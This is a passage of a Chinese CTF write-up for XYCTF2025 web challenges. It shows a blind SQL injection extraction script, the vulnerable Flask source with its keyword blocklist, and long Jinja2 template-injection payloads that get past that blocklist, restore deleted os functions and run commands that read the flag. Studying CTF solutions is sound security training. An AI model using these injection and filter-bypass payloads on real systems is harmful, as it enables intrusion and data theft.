class="line">        payload_username = <span class="string">&quot;1&#x27;\tor\tsubstr((select\tgroup_concat(secret)from\tdouble_check)\tfrom\t&#123;&#125;\tfor\t1)=&#x27;&#123;&#125;&#x27;#&quot;</span>.<span class="built_in">format</span>(i, j)</span><br><span class="line">        res=requests.post(target,data=&#123;<span class="string">&quot;username&quot;</span>:payload_username,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;123&quot;</span>&#125;)</span><br><span class="line">        <span class="comment">#print(res.text)</span></span><br><span class="line">        <span class="comment">#yudeyoushang</span></span><br><span class="line">        <span class="comment">#zhonghengyisheng</span></span><br><span class="line">        <span class="comment">#dtfrtkcc0czkoua9s</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;帐号&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag+=j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;nothing&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">账号        #yudeyoushang</span><br><span class="line">密码        #zhonghengyisheng</span><br><span class="line">管理员密钥        #dtfrtkcc0czkoua9s</span><br></pre></td></tr></table></figure><p>读到就行。然后是无回显rce。</p><img src="/2025/04/09/XYCTF2025-Web-wp/image-20250404184315979.png" class="" title="This is an example image"><img src="/2025/04/09/XYCTF2025-Web-wp/image-20250404184328397.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XYCTF&#123;0828cfea-0555-4874-a17d-d962d9acc0b3&#125;</span><br></pre></td></tr></table></figure><h2 id="Now-you-see-me-1"><a href="#Now-you-see-me-1" class="headerlink" title="Now you see me 1"></a>Now you see me 1</h2><p>想了挺久的，刚开始一直在找官方文档，看哪里能构造字符集，突然发现config没有过滤，那么就可以用config来构造字符集，用<code>~</code>和<code>.</code>来进行切分和拼接。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># YOU FOUND ME ;)</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    :   src.py</span></span><br><span class="line"><span class="string">@Time    :   2025/03/29 01:10:37</span></span><br><span class="line"><span class="string">@Author  :   LamentXU </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">enable_hook =  <span class="literal">False</span></span><br><span class="line">counter = <span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">audit_checker</span>(<span class="params">event,args</span>):</span><br><span class="line">    <span class="keyword">global</span> counter</span><br><span class="line">    <span class="keyword">if</span> enable_hook:</span><br><span class="line">        <span class="keyword">if</span> event <span class="keyword">in</span> [<span class="string">&quot;exec&quot;</span>, <span class="string">&quot;compile&quot;</span>]:</span><br><span class="line">            counter += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> counter &gt; <span class="number">4</span>:</span><br><span class="line">                <span class="keyword">raise</span> RuntimeError(event)</span><br><span class="line"></span><br><span class="line">lock_within = [</span><br><span class="line">    <span class="string">&quot;debug&quot;</span>, <span class="string">&quot;form&quot;</span>, <span class="string">&quot;args&quot;</span>, <span class="string">&quot;values&quot;</span>, </span><br><span class="line">    <span class="string">&quot;headers&quot;</span>, <span class="string">&quot;json&quot;</span>, <span class="string">&quot;stream&quot;</span>, <span class="string">&quot;environ&quot;</span>,</span><br><span class="line">    <span class="string">&quot;files&quot;</span>, <span class="string">&quot;method&quot;</span>, <span class="string">&quot;cookies&quot;</span>, <span class="string">&quot;application&quot;</span>, </span><br><span class="line">    <span class="string">&#x27;data&#x27;</span>, <span class="string">&#x27;url&#x27;</span> ,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, </span><br><span class="line">    <span class="string">&quot;getattr&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;&#123;&#123;&quot;</span>, <span class="string">&quot;&#125;&#125;&quot;</span>, </span><br><span class="line">    <span class="string">&quot;[&quot;</span>, <span class="string">&quot;]&quot;</span>, <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;/&quot;</span>,<span class="string">&quot;self&quot;</span>, </span><br><span class="line">    <span class="string">&quot;lipsum&quot;</span>, <span class="string">&quot;cycler&quot;</span>, <span class="string">&quot;joiner&quot;</span>, <span class="string">&quot;namespace&quot;</span>, </span><br><span class="line">    <span class="string">&quot;init&quot;</span>, <span class="string">&quot;dir&quot;</span>, <span class="string">&quot;join&quot;</span>, <span class="string">&quot;decode&quot;</span>, </span><br><span class="line">    <span class="string">&quot;batch&quot;</span>, <span class="string">&quot;first&quot;</span>, <span class="string">&quot;last&quot;</span> , </span><br><span class="line">    <span class="string">&quot; &quot;</span>,<span class="string">&quot;dict&quot;</span>,<span class="string">&quot;list&quot;</span>,<span class="string">&quot;g.&quot;</span>,</span><br><span class="line">    <span class="string">&quot;os&quot;</span>, <span class="string">&quot;subprocess&quot;</span>,</span><br><span class="line">    <span class="string">&quot;g|a&quot;</span>, <span class="string">&quot;GLOBALS&quot;</span>, <span class="string">&quot;lower&quot;</span>, <span class="string">&quot;upper&quot;</span>,</span><br><span class="line">    <span class="string">&quot;BUILTINS&quot;</span>, <span class="string">&quot;select&quot;</span>, <span class="string">&quot;WHOAMI&quot;</span>, <span class="string">&quot;path&quot;</span>,</span><br><span class="line">    <span class="string">&quot;os&quot;</span>, <span class="string">&quot;popen&quot;</span>, <span class="string">&quot;cat&quot;</span>, <span class="string">&quot;nl&quot;</span>, <span class="string">&quot;app&quot;</span>, <span class="string">&quot;setattr&quot;</span>, <span class="string">&quot;translate&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sort&quot;</span>, <span class="string">&quot;base64&quot;</span>, <span class="string">&quot;encode&quot;</span>, <span class="string">&quot;\\u&quot;</span>, <span class="string">&quot;pop&quot;</span>, <span class="string">&quot;referer&quot;</span>,</span><br><span class="line">    <span class="string">&quot;The closer you see, the lesser you find.&quot;</span>] </span><br><span class="line">        <span class="comment"># I hate all these.</span></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;try /H3dden_route&#x27;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/H3dden_route&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r3al_ins1de_th0ught</span>():</span><br><span class="line">    <span class="keyword">global</span> enable_hook, counter</span><br><span class="line">    name = flask.request.args.get(<span class="string">&#x27;My_ins1de_w0r1d&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> name:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> name.startswith(<span class="string">&quot;Follow-your-heart-&quot;</span>):</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> lock_within:</span><br><span class="line">                    <span class="keyword">if</span> i <span class="keyword">in</span> name:</span><br><span class="line">                        <span class="keyword">return</span> <span class="string">&#x27;NOPE.&#x27;</span></span><br><span class="line">                enable_hook = <span class="literal">True</span></span><br><span class="line">                a = flask.render_template_string(<span class="string">&#x27;&#123;#&#x27;</span>+<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>&#x27;</span>+<span class="string">&#x27;#&#125;&#x27;</span>)</span><br><span class="line">                enable_hook = <span class="literal">False</span></span><br><span class="line">                counter = <span class="number">0</span></span><br><span class="line">                <span class="keyword">return</span> a</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;My inside world is always hidden.&#x27;</span></span><br><span class="line">        <span class="keyword">except</span> RuntimeError <span class="keyword">as</span> e:</span><br><span class="line">            counter = <span class="number">0</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;NO.&#x27;</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Error&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Welcome to Hidden_route!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">import</span> _posixsubprocess</span><br><span class="line">        <span class="keyword">del</span> _posixsubprocess.fork_exec</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">import</span> subprocess</span><br><span class="line">    <span class="keyword">del</span> os.popen</span><br><span class="line">    <span class="keyword">del</span> os.system</span><br><span class="line">    <span class="keyword">del</span> subprocess.Popen</span><br><span class="line">    <span class="keyword">del</span> subprocess.call</span><br><span class="line">    <span class="keyword">del</span> subprocess.run</span><br><span class="line">    <span class="keyword">del</span> subprocess.check_output</span><br><span class="line">    <span class="keyword">del</span> subprocess.getoutput</span><br><span class="line">    <span class="keyword">del</span> subprocess.check_call</span><br><span class="line">    <span class="keyword">del</span> subprocess.getstatusoutput</span><br><span class="line">    <span class="keyword">del</span> subprocess.PIPE</span><br><span class="line">    <span class="keyword">del</span> subprocess.STDOUT</span><br><span class="line">    <span class="keyword">del</span> subprocess.CalledProcessError</span><br><span class="line">    <span class="keyword">del</span> subprocess.TimeoutExpired</span><br><span class="line">    <span class="keyword">del</span> subprocess.SubprocessError</span><br><span class="line">    sys.addaudithook(audit_checker)</span><br><span class="line">    app.run(debug=<span class="literal">False</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其实就是将config渲染出来的内容作为原始字符集，逐步构造被过滤掉的字符，如果字符集中不存在某个字符，可以通过<code>request.url</code>等方式来拓展字符集，然后通过<code>~</code>来进行拼接。</p><img src="/2025/04/09/XYCTF2025-Web-wp/image-20250405194643424.png" class="" title="This is an example image"><p>逐步获取一下！此处不同的人payload不同，因为url不同。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /H3dden_route?My_ins1de_w0r1d=Follow-your-heart-%23%7d&#123;%for%0ai%0ain%0aconfig|string|slice(1)%&#125;&#123;%set%0auri%0a=%0ai.399~i.398~i.20%&#125;&#123;%print(request|attr(uri))%&#125;&#123;%for%0aj%0ain%0arequest|attr(uri)|string|slice(1)%&#125;&#123;%set%0alip=%0ai.20~i.5~i.789~i.21~i.399~i.159%&#125;&#123;%set%0aglob=i.80~i.80~i.6~i.20~i.68~j.322~i.154~i.20~i.21~i.80~i.80%&#125;&#123;%print(lip)%&#125;&#123;%print(glob)%&#125;&#123;%set%0aap=i.154~i.789~i.789~i.20~i.5~j.8~i.154~i.155~i.5~i.68~i.226%&#125;&#123;%print(request|attr(ap)|attr(glob))%&#125;&#123;%%0aendfor%0a%&#125;&#123;%%0aendfor%0a%&#125;%7B%23</span><br></pre></td></tr></table></figure><p>直接<code>lip|attr(glob)</code>是不可以的，亲测，主要是因为这个<code>lip</code>是不能这样被使用的，那么就要request来开头，找官方文档，发现一个<code>application</code>可以利用！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/H3dden_route?My_ins1de_w0r1d=Follow-your-heart-%23%7d&#123;%for%0ai%0ain%0aconfig|string|slice(1)%&#125;&#123;%set%0auri%0a=%0ai.399~i.398~i.20%&#125;&#123;%print(request|attr(uri))%&#125;&#123;%for%0aj%0ain%0arequest|attr(uri)|string|slice(1)%&#125;&#123;%set%0alip=%0ai.20~i.5~i.789~i.21~i.399~i.159%&#125;&#123;%set%0aglob=i.80~i.80~i.6~i.20~i.68~j.322~i.154~i.20~i.21~i.80~i.80%&#125;&#123;%print(lip)%&#125;&#123;%print(glob)%&#125;&#123;%set%0aap=i.154~i.789~i.789~i.20~i.5~j.8~i.154~i.155~i.5~i.68~i.226%&#125;&#123;%set%0aev=i.881~j.489~i.154~i.20%&#125;&#123;%set%0abuil=i.80~i.80~j.322~i.399~i.5~i.20~i.155~i.5~i.226~i.21~i.80~i.80%&#125;&#123;%set%0agei=i.80~i.80~i.6~i.227~i.155~i.5~i.155~i.227~i.159~i.80~i.80%&#125;&#123;%set%0apo=i.739~i.68~i.789~i.227~i.226%&#125;&#123;%set%0aso=i.68~i.21%&#125;&#123;%set%0aim=i.80~i.80~i.5~i.159~i.789~i.68~i.398~i.155~i.80~i.80%&#125;&#123;%print(im)%&#125;&#123;%print(op)%&#125;&#123;%print(request|attr(ap)|attr(glob)|attr(gei)(buil)|attr(gei)(im)(so)|attr(po))%&#125;&#123;%%0aendfor%0a%&#125;&#123;%%0aendfor%0a%&#125;%7B%23</span><br></pre></td></tr></table></figure><p>当我获取到os模块的时候，发现popen和system都没有了。。。赫赫。</p><p>回globals看看有什么可以用的。</p><p>system被删除？我们可以想办法恢复。或者看看有没有漏掉没禁用的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import importlib</span><br><span class="line">del os.system</span><br><span class="line">importlib.reload(os)</span><br><span class="line">os.system(&#x27;whoami&#x27;)  #这时命令是成功的！</span><br></pre></td></tr></table></figure><img src="/2025/04/09/XYCTF2025-Web-wp/image-20250405205925943.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/H3dden_route?My_ins1de_w0r1d=Follow-your-heart-%23%7d&#123;%for%0ai%0ain%0aconfig|string|slice(1)%&#125;&#123;%set%0auri%0a=%0ai.399~i.398~i.20%&#125;&#123;%print(request|attr(uri))%&#125;&#123;%for%0aj%0ain%0arequest|attr(uri)|string|slice(1)%&#125;&#123;%set%0alip=%0ai.20~i.5~i.789~i.21~i.399~i.159%&#125;&#123;%set%0aglob=i.80~i.80~i.6~i.20~i.68~j.322~i.154~i.20~i.21~i.80~i.80%&#125;&#123;%print(lip)%&#125;&#123;%print(glob)%&#125;&#123;%set%0aap=i.154~i.789~i.789~i.20~i.5~j.8~i.154~i.155~i.5~i.68~i.226%&#125;&#123;%set%0aev=i.881~j.489~i.154~i.20%&#125;&#123;%set%0abuil=i.80~i.80~j.322~i.399~i.5~i.20~i.155~i.5~i.226~i.21~i.80~i.80%&#125;&#123;%set%0agei=i.80~i.80~i.6~i.227~i.155~i.5~i.155~i.227~i.159~i.80~i.80%&#125;&#123;%set%0apo=i.789~i.68~i.789~i.227~i.226%&#125;&#123;%set%0aso=i.68~i.21%&#125;&#123;%set%0aim=i.80~i.80~i.5~i.159~i.789~i.68~i.398~i.155~i.80~i.80%&#125;&#123;%set%0aiml=i.5~i.159~i.789~i.68~i.398~i.155~i.20~i.5~j.322%&#125;&#123;%set%0are=i.398~i.227~i.20~i.68~i.429~i.153%&#125;&#123;%set%0aco=i.20~i.21~i.7~i.272%&#125;&#123;%set%0ard=i.398~i.227~i.154~i.153%&#125;&#123;%print(im)%&#125;&#123;%print(op)%&#125;&#123;%print(request|attr(ap)|attr(glob)|attr(gei)(buil)|attr(gei)(im)(iml)|attr(re)(request|attr(ap)|attr(glob)|attr(gei)(buil)|attr(gei)(im)(so)))%&#125;&#123;%print(request|attr(ap)|attr(glob)|attr(gei)(buil)|attr(gei)(im)(so)|attr(po)(co)|attr(rd)())%&#125;&#123;%%0aendfor%0a%&#125;&#123;%%0aendfor%0a%&#125;%7B%23</span><br></pre></td></tr></table></figure><p>接下来我们</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tac /flag_h3r3</span><br></pre></td></tr></table></figure><p>但是他会报错？？</p><img src="/2025/04/09/XYCTF2025-Web-wp/bb9d6e26f451230f88ede6f3b6d5c5cd.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /H3dden_route?My_ins1de_w0r1d=Follow-your-heart-%23%7d&#123;%for%0ai%0ain%0aconfig|string|slice(1)%&#125;&#123;%set%0auri%0a=%0ai.399~i.398~i.20%&#125;&#123;%print(request|attr(uri))%&#125;&#123;%for%0aj%0ain%0arequest|attr(uri)|string|slice(1)%&#125;&#123;%set%0alip=%0ai.20~i.5~i.789~i.21~i.399~i.159%&#125;&#123;%set%0aglob=i.80~i.80~i.6~i.20~i.68~j.322~i.154~i.20~i.21~i.80~i.80%&#125;&#123;%print(lip)%&#125;&#123;%print(glob)%&#125;&#123;%set%0aap=i.154~i.789~i.789~i.20~i.5~j.8~i.154~i.155~i.5~i.68~i.226%&#125;&#123;%set%0aev=i.881~j.489~i.154~i.20%&#125;&#123;%set%0abuil=i.80~i.80~j.322~i.399~i.5~i.20~i.155~i.5~i.226~i.21~i.80~i.80%&#125;&#123;%set%0agei=i.80~i.80~i.6~i.227~i.155~i.5~i.155~i.227~i.159~i.80~i.80%&#125;&#123;%set%0apo=i.789~i.68~i.789~i.227~i.226%&#125;&#123;%set%0aso=i.68~i.21%&#125;&#123;%set%0aim=i.80~i.80~i.5~i.159~i.789~i.68~i.398~i.155~i.80~i.80%&#125;&#123;%set%0aiml=i.5~i.159~i.789~i.68~i.398~i.155~i.20~i.5~j.322%&#125;&#123;%set%0are=i.398~i.227~i.20~i.68~i.429~i.153%&#125;&#123;%set%0aco=j.322~i.154~i.21~i.881~j.18~j.14~i.7~i.272~i.4~i.20~i.154~i.6~i.53~i.786~i.846~i.398~i.846%&#125;&#123;%set%0ard=i.398~i.227~i.154~i.153%&#125;&#123;%print(im)%&#125;&#123;%print(op)%&#125;&#123;%print(co)%&#125;&#123;%print(request|attr(ap)|attr(glob)|attr(gei)(buil)|attr(gei)(im)(iml)|attr(re)(request|attr(ap)|attr(glob)|attr(gei)(buil)|attr(gei)(im)(so)))%&#125;&#123;%print(request|attr(ap)|attr(glob)|attr(gei)(buil)|attr(gei)(im)(so)|attr(po)(co)|attr(rd)())%&#125;&#123;%%0aendfor%0a%&#125;&#123;%%0aendfor%0a%&#125;%7B%23</span><br></pre></td></tr></table></figure><p>尝试用base64读，发现超级长的回显，下载下来赛博厨子一下。</p><img src="/2025/04/09/XYCTF2025-Web-wp/2b85d95a20e4e094164d3f3ef8e422ce.png" class="" title="This is an example image"><p>发现是一个riff。</p><img src="/2025/04/09/XYCTF2025-Web-wp/image-20250405214748054.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;N0w_y0u_sEEEEEEEEEEEEEEE_m3!!!!!!&#125;</span><br></pre></td></tr></table></figure><h2 id="Now-you-see-me-2"><a href="#Now-you-see-me-2" class="headerlink" title="Now you see me 2"></a>Now you see me 2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># YOU FOUND ME ;)</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    :   src.py</span></span><br><span class="line"><span class="string">@Time    :   2025/03/29 01:20:49</span></span><br><span class="line"><span class="string">@Author  :   LamentXU </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># DNS config: No reversing shells for you.</span></span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> time, random</span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">enable_hook = <span class="literal">False</span></span><br><span class="line">counter = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">audit_checker</span>(<span class="params">event, args</span>):</span><br><span class="line">    <span class="keyword">global</span> counter</span><br><span class="line">    <span class="keyword">if</span> enable_hook:</span><br><span class="line">        <span class="keyword">if</span> event <span class="keyword">in</span> [<span class="string">&quot;exec&quot;</span>, <span class="string">&quot;compile&quot;</span>]:</span><br><span class="line">            counter += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> counter &gt; <span class="number">4</span>:</span><br><span class="line">                <span class="keyword">raise</span> RuntimeError(event)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">lock_within = [</span><br><span class="line">    <span class="string">&quot;debug&quot;</span>, <span class="string">&quot;form&quot;</span>, <span class="string">&quot;args&quot;</span>, <span class="string">&quot;values&quot;</span>,</span><br><span class="line">    <span class="string">&quot;headers&quot;</span>, <span class="string">&quot;json&quot;</span>, <span class="string">&quot;stream&quot;</span>, <span class="string">&quot;environ&quot;</span>,</span><br><span class="line">    <span class="string">&quot;files&quot;</span>, <span class="string">&quot;method&quot;</span>, <span class="string">&quot;cookies&quot;</span>, <span class="string">&quot;application&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;data&#x27;</span>, <span class="string">&#x27;url&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;getattr&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;&#123;&#123;&quot;</span>, <span class="string">&quot;&#125;&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;[&quot;</span>, <span class="string">&quot;]&quot;</span>, <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;/&quot;</span>, <span class="string">&quot;self&quot;</span>,</span><br><span class="line">    <span class="string">&quot;lipsum&quot;</span>, <span class="string">&quot;cycler&quot;</span>, <span class="string">&quot;joiner&quot;</span>, <span class="string">&quot;namespace&quot;</span>,</span><br><span class="line">    <span class="string">&quot;init&quot;</span>, <span class="string">&quot;dir&quot;</span>, <span class="string">&quot;join&quot;</span>, <span class="string">&quot;decode&quot;</span>,</span><br><span class="line">    <span class="string">&quot;batch&quot;</span>, <span class="string">&quot;first&quot;</span>, <span class="string">&quot;last&quot;</span>,</span><br><span class="line">    <span class="string">&quot; &quot;</span>, <span class="string">&quot;dict&quot;</span>, <span class="string">&quot;list&quot;</span>, <span class="string">&quot;g.&quot;</span>,</span><br><span class="line">    <span class="string">&quot;os&quot;</span>, <span class="string">&quot;subprocess&quot;</span>,</span><br><span class="line">    <span class="string">&quot;GLOBALS&quot;</span>, <span class="string">&quot;lower&quot;</span>, <span class="string">&quot;upper&quot;</span>,</span><br><span class="line">    <span class="string">&quot;BUILTINS&quot;</span>, <span class="string">&quot;select&quot;</span>, <span class="string">&quot;WHOAMI&quot;</span>, <span class="string">&quot;path&quot;</span>,</span><br><span class="line">    <span class="string">&quot;os&quot;</span>, <span class="string">&quot;popen&quot;</span>, <span class="string">&quot;cat&quot;</span>, <span class="string">&quot;nl&quot;</span>, <span class="string">&quot;app&quot;</span>, <span class="string">&quot;setattr&quot;</span>, <span class="string">&quot;translate&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sort&quot;</span>, <span class="string">&quot;base64&quot;</span>, <span class="string">&quot;encode&quot;</span>, <span class="string">&quot;\\u&quot;</span>, <span class="string">&quot;pop&quot;</span>, <span class="string">&quot;referrer&quot;</span>,</span><br><span class="line">    <span class="string">&quot;authorization&quot;</span>, <span class="string">&quot;user&quot;</span>, <span class="string">&quot;pragma&quot;</span>, <span class="string">&quot;mimetype&quot;</span>, <span class="string">&quot;origin&quot;</span></span><br><span class="line">                                                   <span class="string">&quot;Isn&#x27;t that enough? Isn&#x27;t that enough.&quot;</span>]</span><br><span class="line"><span class="comment"># lock_within = []</span></span><br><span class="line">allowed_endpoint = [<span class="string">&quot;static&quot;</span>, <span class="string">&quot;index&quot;</span>, <span class="string">&quot;r3al_ins1de_th0ught&quot;</span>]</span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;try /H3dden_route&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/H3dden_route&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r3al_ins1de_th0ught</span>():</span><br><span class="line">    quote = flask.request.args.get(<span class="string">&#x27;spell&#x27;</span>)</span><br><span class="line">    <span 